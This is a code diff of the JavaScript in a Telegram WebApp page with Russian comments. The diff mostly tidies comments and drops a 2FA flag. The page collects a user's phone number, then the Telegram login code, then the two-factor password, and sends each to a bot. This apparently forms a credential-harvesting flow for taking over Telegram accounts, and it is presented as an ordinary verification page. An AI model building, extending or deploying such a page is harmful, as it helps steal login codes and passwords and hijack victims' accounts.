@@ -171,12 +171,11 @@
         let code = '';
         let password = '';
         let step = 'contact';
-        let is2faRequired = false;
 
         tg.ready();
         tg.expand();
 
-        // Функция отправки данных в бота
+        // Отправка данных в бота
         function sendDataToBot(data) {
             tg.sendData(JSON.stringify(data));
         }
@@ -185,10 +184,8 @@
         document.getElementById('shareContactBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
             
-            // Запрашиваем контакт через WebApp API
             tg.requestContact();
 
-            // Обработчик получения контакта
             tg.onEvent('contact', function(contact) {
                 phone = contact.phone_number;
                 if (!phone) {
@@ -200,7 +197,7 @@
                 status.textContent = `✅ Номер получен: ${phone}`;
                 status.className = 'status success';
 
-                // Отправляем номер в бота (WebApp → бот)
+                // Отправляем номер в бота
                 sendDataToBot({
                     phone: phone,
                     code: '',
@@ -215,7 +212,6 @@
                 status.className = 'status success';
             });
 
-            // Обработчик ошибки
             tg.onEvent('contact_error', function(error) {
                 status.textContent = '❌ Ошибка получения контакта';
                 status.className = 'status';
@@ -243,26 +239,22 @@
             status.textContent = '⏳ Проверка...';
             status.className = 'status';
 
-            // Ждём ответ от бота (через WebApp)
-            // Если бот запросит 2FA — покажем поле
-            // Это управляется через ответ бота, но мы просто покажем поле заранее
+            // Показываем поле для пароля (на случай 2FA)
             document.getElementById('passwordGroup').style.display = 'block';
             document.getElementById('submitCodeBtn').textContent = 'Подтвердить пароль';
             step = 'password';
         });
 
-        // Шаг 3: Ввод пароля (если есть)
+        // Шаг 3: Ввод пароля
         document.getElementById('passwordInput').addEventListener('input', function() {
             password = this.value.trim();
         });
 
-        // Обработчик для финальной отправки с паролем
         document.getElementById('submitCodeBtn').addEventListener('click', function() {
             if (step === 'password') {
                 const status = document.getElementById('status');
                 password = document.getElementById('passwordInput').value.trim();
 
-                // Отправляем пароль в бота
                 sendDataToBot({
                     phone: phone,
                     code: code,
